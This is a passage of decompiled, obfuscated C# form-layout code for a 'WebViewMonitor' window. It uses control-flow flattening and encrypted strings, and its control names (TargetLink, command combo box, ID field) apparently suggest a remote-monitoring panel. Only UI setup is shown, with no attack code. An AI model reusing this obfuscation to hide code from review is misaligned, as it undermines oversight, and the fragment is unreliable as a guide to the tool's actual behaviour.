            ((WebViewMonitor) this).SaveCheck.TextAlign = ContentAlignment.TopCenter;
            ((WebViewMonitor) this).Panel6.Controls.Add((Control) ((WebViewMonitor) this).TargetLink);
            ((WebViewMonitor) this).Panel6.Controls.Add((Control) ((WebViewMonitor) this).Mytitle);
            ((WebViewMonitor) this).Panel6.Controls.Add((Control) ((WebViewMonitor) this).DrakeUIComboBox1);
            ((WebViewMonitor) this).Panel6.Controls.Add((Control) ((WebViewMonitor) this).openbtn);
            num1 = (int) num3 * 1697640507 ^ -1835620970;
            continue;
          case 382:
            ((WebViewMonitor) this).TabPage1.Controls.Add((Control) ((WebViewMonitor) this).vewimage);
            num1 = (int) num3 * 1600680871 ^ -1966716435;
            continue;
          case 383:
            ((WebViewMonitor) this).tabcontrols.Size = new Size(928, 533);
            ((WebViewMonitor) this).tabcontrols.SizeMode = TabSizeMode.Fixed;
            ((WebViewMonitor) this).tabcontrols.Style = UIStyle.Custom;
            num1 = (int) num3 * -1186821093 ^ 1167786115;
            continue;
          case 384:
            ((WebViewMonitor) this).tabcontrols.TabSelectedHighColor = Color.Black;
            num1 = (int) num3 * -1159110952 ^ -1608382307;
            continue;
          case 385:
            ((WebViewMonitor) this).SaveCheck.TabIndex = 22;
            ((WebViewMonitor) this).SaveCheck.Text = EXGuarder.\u003095E431D;
            num1 = (int) num3 * -291723552 ^ -148190090;
            continue;
          case 386:
            ((WebViewMonitor) this).commndbtn.Radius = 25;
            num1 = (int) num3 * -1932964973 ^ 1371714108;
            continue;
          case 387:
            ((WebViewMonitor) this).comandcombo.Items.AddRange(new object[4]
            {
              (object) EXGuarder.\u00306764E40,
              (object) EXGuarder.\u0033B1E3A16,
              (object) EXGuarder.\u003152E4D0A,
              (object) EXGuarder.\u003431A5416
            });
            ((WebViewMonitor) this).comandcombo.Location = new Point(690, 7);
            num1 = (int) num3 * 1327747502 ^ 1157278290;
            continue;
          case 388:
            ((WebViewMonitor) this).savbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 1335870258 ^ -1885682315;
            continue;
          case 389:
            ((WebViewMonitor) this).Panel4.PerformLayout();
            ((WebViewMonitor) this).TabPage3.ResumeLayout(false);
            ((WebViewMonitor) this).datapanel.ResumeLayout(false);
            num1 = (int) num3 * -2073905550 ^ 1016201633;
            continue;
          case 390:
            ((WebViewMonitor) this).datapanel.SuspendLayout();
            num1 = (int) num3 * -417064242 ^ -1237368228;
            continue;
          case 391:
            ((WebViewMonitor) this).TargetLink.Radius = 15;
            num1 = (int) num3 * 1453275329 ^ 1698823300;
            continue;
          case 392:
            ((WebViewMonitor) this).idtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).idtext.Size = new Size(121, 27);
            ((WebViewMonitor) this).idtext.Style = UIStyle.Custom;
            num1 = (int) num3 * 831790880 ^ 496874745;
            continue;
          case 393:
            ((WebViewMonitor) this).refbtn.Text = EXGuarder.\u003176D6E30;
            num1 = (int) num3 * -982406296 ^ -1592958529;
            continue;
          case 394:
            ((WebViewMonitor) this).cpybtn.Name = EXGuarder.\u0030B13370A;
            ((WebViewMonitor) this).cpybtn.Radius = 25;
            num1 = (int) num3 * 229944036 ^ -93823478;
            continue;
          default:
            goto label_397;
        }
      }
label_3:
      return;
label_397:;
    }
  }
}
